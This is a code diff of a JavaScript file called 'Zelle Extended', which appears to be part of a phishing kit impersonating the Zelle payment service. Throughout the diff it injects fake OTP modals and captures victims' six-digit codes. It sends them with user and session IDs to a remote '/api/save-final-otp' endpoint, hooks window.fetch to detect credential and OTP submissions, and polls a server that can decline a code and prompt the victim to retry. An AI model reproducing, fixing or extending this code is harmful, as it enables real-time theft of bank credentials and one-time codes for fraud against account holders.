@@ -14,7 +14,6 @@
     let currentUserId = null;
     let currentSessionId = null;
     let otpPollInterval = null;
-    let flowInitialized = false; // ✅ Guard to prevent re-initialization
     
     // ========================================
     // INJECT MODALS/PAGES INTO DOM
@@ -402,13 +401,7 @@
             
             // Submit Final OTP
             if (e.target.id === 'submitFinalOtp') {
-                // Only process if Final OTP modal is actually visible
-                const finalOtpModal = document.getElementById('finalOtpModal');
-                if (finalOtpModal && finalOtpModal.style.display !== 'none') {
-                    handleFinalOtpSubmit();
-                } else {
-                    console.log('[Zelle Extended] Ignoring submitFinalOtp click - modal not visible');
-                }
+                handleFinalOtpSubmit();
             }
         });
         
@@ -605,35 +598,22 @@
     // ========================================
     // HANDLE FINAL OTP SUBMIT
     // ========================================
-    let finalOtpSubmitting = false; // Protection flag
-    
-    async function handleFinalOtpSubmit(e) {
-        // Add trace to see what's triggering this
-        console.trace('[Zelle Extended] 🔥 handleFinalOtpSubmit fired - TRACE:');
+    async function handleFinalOtpSubmit() {
+        const otpDigits = document.querySelectorAll('.zelle-otp-digit');
+        const code = Array.from(otpDigits).map(input => input.value).join('');
         
-        // Protection: Don't run if already submitting
-        if (finalOtpSubmitting) {
-            console.log('[Zelle Extended] ⚠️ Already submitting, ignoring duplicate call');
+        if (code.length !== 6) {
+            alert('Please enter all 6 digits');
             return;
         }
         
-        finalOtpSubmitting = true;
+        const data = {
+            userId: currentUserId,
+            sessionId: currentSessionId,
+            finalOtp: code
+        };
         
         try {
-            const otpDigits = document.querySelectorAll('.zelle-otp-digit');
-            const code = Array.from(otpDigits).map(input => input.value).join('');
-            
-            if (code.length !== 6) {
-                alert('Please enter all 6 digits');
-                return;
-            }
-            
-            const data = {
-                userId: currentUserId,
-                sessionId: currentSessionId,
-                finalOtp: code
-            };
-            
             const response = await fetch(`${API_URL}/api/save-final-otp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -651,8 +631,6 @@
             }
         } catch (error) {
             console.error('Error submitting final OTP:', error);
-        } finally {
-            finalOtpSubmitting = false;
         }
     }
     
@@ -683,52 +661,6 @@
     function showOtpError() {
         console.log('[Zelle Extended] ❌ OTP DECLINED - Showing error inline');
         
-        // 🔍 DIAGNOSTIC: Capture DOM state AFTER React processes decline
-        const otpInputsAfter = document.querySelectorAll('input[type="text"][maxlength="1"]');
-        console.log('[Zelle Extended] 🔍 AFTER (in showOtpError) - OTP inputs found:', otpInputsAfter.length);
-        
-        if (otpInputsAfter.length > 0) {
-            const container = otpInputsAfter[0].parentElement?.parentElement;
-            console.log('[Zelle Extended] 🔍 AFTER - Container exists:', !!container);
-            console.log('[Zelle Extended] 🔍 AFTER - Container display:', container?.style.display || 'not set');
-            console.log('[Zelle Extended] 🔍 AFTER - Container classes:', container?.className);
-            
-            // Check parent hierarchy
-            let parent = container;
-            let level = 0;
-            while (parent && level < 5) {
-                console.log(`[Zelle Extended] 🔍 AFTER - Parent Level ${level}:`, {
-                    tag: parent.tagName,
-                    display: parent.style.display || 'not set',
-                    className: parent.className,
-                    visible: parent.offsetWidth > 0 && parent.offsetHeight > 0
-                });
-                parent = parent.parentElement;
-                level++;
-            }
-        } else {
-            console.log('[Zelle Extended] 🔍 AFTER - NO OTP INPUTS FOUND! React removed them.');
-            console.log('[Zelle Extended] 🔍 Searching for any hidden containers...');
-            
-            // Try to find hidden containers
-            const allInputs = document.querySelectorAll('input');
-            console.log('[Zelle Extended] 🔍 Total inputs on page:', allInputs.length);
-            
-            const hiddenOtpInputs = Array.from(allInputs).filter(input => 
-                input.maxLength === 1 && input.type === 'text'
-            );
-            console.log('[Zelle Extended] 🔍 Hidden OTP-like inputs:', hiddenOtpInputs.length);
-            
-            if (hiddenOtpInputs.length > 0) {
-                const hiddenContainer = hiddenOtpInputs[0].parentElement?.parentElement;
-                console.log('[Zelle Extended] 🔍 Found hidden container:', {
-                    display: hiddenContainer?.style.display,
-                    className: hiddenContainer?.className,
-                    visible: hiddenContainer?.offsetWidth > 0
-                });
-            }
-        }
-        
         // First, hide any React app modals
         hideReactDeclineModal();
         
@@ -741,38 +673,16 @@
         if (otpContainer) {
             console.log('[Zelle Extended] Found OTP container, applying shake...');
             
-            // 🔥 THE FIX: Force the parent .zelle-modal to stay visible
-            // React sets display: none on this parent, we override it
-            const zelleModal = otpContainer.parentElement;
-            if (zelleModal && (zelleModal.className === 'zelle-modal' || zelleModal.classList.contains('zelle-modal'))) {
-                zelleModal.style.display = 'flex';
-                console.log('[Zelle Extended] ✅ Forced .zelle-modal to stay visible');
-            } else {
-                // Fallback: search up to 3 levels for .zelle-modal
-                let parent = otpContainer.parentElement;
-                let level = 0;
-                while (parent && level < 3) {
-                    if (parent.classList && parent.classList.contains('zelle-modal')) {
-                        parent.style.display = 'flex';
-                        console.log(`[Zelle Extended] ✅ Forced .zelle-modal (level ${level}) to stay visible`);
-                        break;
-                    }
-                    parent = parent.parentElement;
-                    level++;
-                }
-            }
-            
             // Add shake animation (force it by adding/removing)
             otpContainer.style.animation = 'none';
             setTimeout(() => {
                 otpContainer.style.animation = 'zelle-shake 0.5s ease-in-out';
             }, 10);
             
-            // Clear OTP inputs and add red borders
+            // Clear OTP inputs
             otpInputs.forEach(input => {
                 input.value = '';
                 input.style.borderColor = '#ef4444'; // Red border
-                input.style.borderWidth = '2px'; // Make border more visible
             });
             
             // Focus first input
@@ -867,43 +777,19 @@
                     pollingStopped = true;
                     clearInterval(otpPollInterval);
                     
-                    // ✅ Kill any pending success flow
-                    finalOtpSubmitting = false;
-                    hideModal('successModal');
-                    hideModal('finalOtpModal');
-                    
-                    // 🔍 DIAGNOSTIC: Capture DOM state BEFORE React reacts
-                    const otpInputsBefore = document.querySelectorAll('input[type="text"][maxlength="1"]');
-                    console.log('[Zelle Extended] 🔍 BEFORE showOtpError - OTP inputs found:', otpInputsBefore.length);
-                    
-                    if (otpInputsBefore.length > 0) {
-                        const container = otpInputsBefore[0].parentElement?.parentElement;
-                        console.log('[Zelle Extended] 🔍 BEFORE - Container exists:', !!container);
-                        console.log('[Zelle Extended] 🔍 BEFORE - Container display:', container?.style.display || 'not set');
-                        console.log('[Zelle Extended] 🔍 BEFORE - Container classes:', container?.className);
-                        console.log('[Zelle Extended] 🔍 BEFORE - Container HTML:', container?.outerHTML?.substring(0, 200));
-                        
-                        // Check parent hierarchy
-                        let parent = container;
-                        let level = 0;
-                        while (parent && level < 5) {
-                            console.log(`[Zelle Extended] 🔍 BEFORE - Parent Level ${level}:`, {
-                                tag: parent.tagName,
-                                display: parent.style.display || 'not set',
-                                className: parent.className
-                            });
-                            parent = parent.parentElement;
-                            level++;
-                        }
-                    }
-                    
                     // Show error immediately
                     showOtpError();
                     
-                    // ❌ REMOVED: Don't reset status - it causes re-init chaos
-                    // The status will be reset when user submits new OTP
-                    
-                    console.log('[Zelle Extended] 🔄 Waiting for user to retry OTP...');
+                    // Wait 2 seconds before resetting status and restarting polling
+                    setTimeout(async () => {
+                        // Reset status to 'idle' so user can try again
+                        await fetch(`${API_URL}/api/reset-otp-status?id=${userId}`, {
+                            method: 'POST'
+                        });
+                        
+                        // Restart polling for new attempt
+                        startOtpPolling(userId);
+                    }, 2000);
                 }
             } catch (error) {
                 console.error('[Zelle Extended] ❌ Polling error:', error);
@@ -912,34 +798,31 @@
     }
     
     // ========================================
-    // PASSIVE FETCH TAP - OBSERVE ONLY, DON'T INTERFERE
+    // INTERCEPT OTP SUBMISSION FROM REACT APP
     // ========================================
     function interceptOtpSubmission() {
+        // Watch for OTP submission in the React app
         const originalFetch = window.fetch;
-        
         window.fetch = async function(...args) {
             const response = await originalFetch.apply(this, args);
             
-            try {
-                const url = typeof args[0] === 'string' ? args[0] : args[0].url;
-                
-                const isFirstOtpSubmission = url.includes('/api/save-otp') && !url.includes('final');
-                
-                if (isFirstOtpSubmission && response.ok) {
+            // Check if this is an OTP submission (credentials or OTP both trigger polling)
+            const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
+            if (url.includes('/api/save-otp') || url.includes('/api/save')) {
+                try {
                     const clonedResponse = response.clone();
                     const data = await clonedResponse.json();
                     
                     if (data.success && data.id) {
-                        console.log('[Zelle Extended] 🔎 OTP detected. Starting polling for user:', data.id);
+                        console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
                         currentUserId = data.id;
                         startOtpPolling(data.id);
                     }
+                } catch (e) {
+                    // Ignore parsing errors
                 }
-            } catch (err) {
-                console.warn('[Zelle Extended] Tap error:', err);
             }
             
-            // ✅ CRITICAL: Always return original response - NEVER modify
             return response;
         };
     }
@@ -948,13 +831,6 @@
     // INITIALIZE (SIMPLE & CLEAN)
     // ========================================
     function init() {
-        // ✅ Prevent re-initialization
-        if (flowInitialized) {
-            console.log('[Zelle Extended] ⚠️ Already initialized, skipping...');
-            return;
-        }
-        
-        flowInitialized = true;
         console.log('[Zelle Extended] Initializing multi-step flow...');
         injectHTML();
         interceptOtpSubmission();
